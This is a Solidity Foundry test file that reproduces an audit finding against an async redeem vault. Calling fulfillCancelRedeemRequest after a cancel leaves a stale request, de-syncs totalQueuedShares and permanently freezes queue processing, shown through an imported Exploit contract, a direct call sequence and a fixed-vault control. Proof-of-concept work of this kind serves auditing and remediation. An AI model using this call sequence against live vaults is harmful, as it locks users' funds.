// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    AccountableAsyncRedeemVault,
    AccountableAsyncRedeemVaultFixed,
    RedeemQueueVaultBase,
    MiniToken
} from "./62969-accountableasyncredeemvaultfulfillcancelredeemrequest-can-de.sol";

contract FulfillCancelRedeemQueueDoSTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    address internal constant USER = 0x0000000000000000000000000000000000000B0b;
    uint256 internal constant REDEEM_SHARES = 100 ether;

    // ── The exploit reproduces the permanent queue DoS via the buggy vault. ──
    function test_exploit_fulfillCancelDesyncsQueue_permanentDoS() public {
        Exploit e = new Exploit();
        e.run();

        // De-sync: the request survives with full shares, pending was zeroed,
        // and totalQueuedShares was never decremented.
        assertEq(e.staleRequestShares(), REDEEM_SHARES, "stale request retains 100 shares");
        assertEq(e.pendingAfter(), 0, "pendingRedeemRequest zeroed");
        assertEq(e.totalQueuedAfter(), REDEEM_SHARES, "totalQueuedShares de-synced from pending");

        // Liveness harm: queue processing reverts, and stays reverting (permanent).
        assertTrue(e.dosConfirmed(), "processUpToShares reverts (NoRedeemRequest)");
        assertTrue(e.dosStillFrozen(), "queue processing permanently frozen");

        // Frozen-shares magnitude recorded at the SINK.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), REDEEM_SHARES, "marker records 100 frozen shares at SINK");
    }

    // ── Direct proof against the real buggy vault (no Exploit wrapper). ──
    function test_buggyVault_processReverts_NoRedeemRequest() public {
        AccountableAsyncRedeemVault vault = new AccountableAsyncRedeemVault(address(this));
        vault.requestRedeem(REDEEM_SHARES, USER);
        uint128 reqId = vault.getRequestId(USER);
        vault.cancelRedeemRequest(reqId, USER);
        vault.fulfillCancelRedeemRequest(USER);

        // Buggy _reduce(controller, 0) left the request in place.
        assertEq(vault.getRequestShares(USER), REDEEM_SHARES, "request not cleared");
        assertEq(vault.getPendingRedeem(USER), 0, "pending zeroed");
        assertEq(vault.totalQueuedShares(), REDEEM_SHARES, "totalQueuedShares de-synced");

        // The exact revert selector from the finding.
        vm.expectRevert(RedeemQueueVaultBase.NoRedeemRequest.selector);
        vault.processUpToShares(type(uint256).max);
    }

    // ── Negative control: the recommended fix clears the request and lets the
    //    queue process cleanly (no desync, no DoS). ──
    function test_control_fixedVault_clearsRequest_processSucceeds() public {
        AccountableAsyncRedeemVaultFixed vault = new AccountableAsyncRedeemVaultFixed(address(this));
        vault.requestRedeem(REDEEM_SHARES, USER);
        uint128 reqId = vault.getRequestId(USER);
        vault.cancelRedeemRequest(reqId, USER);
        vault.fulfillCancelRedeemRequest(USER);

        // Fixed path reduced the true pending shares -> request deleted, totals synced.
        assertEq(vault.getRequestShares(USER), 0, "request cleared by fixed _reduce");
        assertEq(vault.getPendingRedeem(USER), 0, "pending zeroed");
        assertEq(vault.totalQueuedShares(), 0, "totalQueuedShares synced to 0");

        // No stale request remains -> batch processing does NOT revert.
        vault.processUpToShares(type(uint256).max);
    }
}
